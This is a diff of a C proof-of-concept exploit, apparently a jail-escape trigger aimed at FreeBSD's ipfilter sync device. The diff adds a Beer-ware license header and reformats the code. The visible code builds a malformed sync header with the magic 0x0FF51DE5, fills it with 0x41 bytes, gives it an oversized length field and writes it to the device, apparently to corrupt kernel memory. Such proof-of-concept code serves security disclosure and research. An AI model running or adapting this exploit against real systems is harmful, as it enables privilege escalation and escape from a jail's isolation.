@@ -1,3 +1,12 @@
+/*
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (Revision 42):
+ * Ilja van Sprundel and Michael Smith wrote this file. As long as you retain
+ * this notice you can do whatever you want with this stuff. If we meet some
+ * day, and you think this stuff is worth it, you can buy us a beer in return
+ * ---------------------------------------------------------------------------
+ */
+
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -30,16 +39,16 @@ service devfs restart
 service jail restart prisonbreak
 */
 
-typedef struct  synchdr {
-  u_32_t    sm_magic; /* magic */
-  u_char    sm_v;   /* version: 4,6 */
-  u_char    sm_p;   /* protocol */
-  u_char    sm_cmd;   /* command */
-  u_char    sm_table; /* NAT, STATE, etc */
-  u_int   sm_num;   /* table entry number */
-  int   sm_rev;   /* forward/reverse */
-  int   sm_len;   /* length of the data section */
-  void *sm_sl;   /* back pointer to parent */
+typedef struct synchdr {
+  u_32_t sm_magic; /* magic */
+  u_char sm_v;     /* version: 4,6 */
+  u_char sm_p;     /* protocol */
+  u_char sm_cmd;   /* command */
+  u_char sm_table; /* NAT, STATE, etc */
+  u_int sm_num;    /* table entry number */
+  int sm_rev;      /* forward/reverse */
+  int sm_len;      /* length of the data section */
+  void* sm_sl;     /* back pointer to parent */
 } synchdr_t;
 
 int main() {
@@ -50,14 +59,13 @@ int main() {
     exit(0);
   }
 
-  synchdr_t *header = malloc(LEN);
+  synchdr_t* header = malloc(LEN);
   memset(header, 0x41, LEN);
   header->sm_magic = htonl(0x0FF51DE5);
   header->sm_v = 4;
   header->sm_cmd = 0;
   header->sm_table = 0;
   header->sm_len = htonl(LEN - 100);
-
 
   int wlen = write(fd, header, LEN);
   if (wlen == -1) {
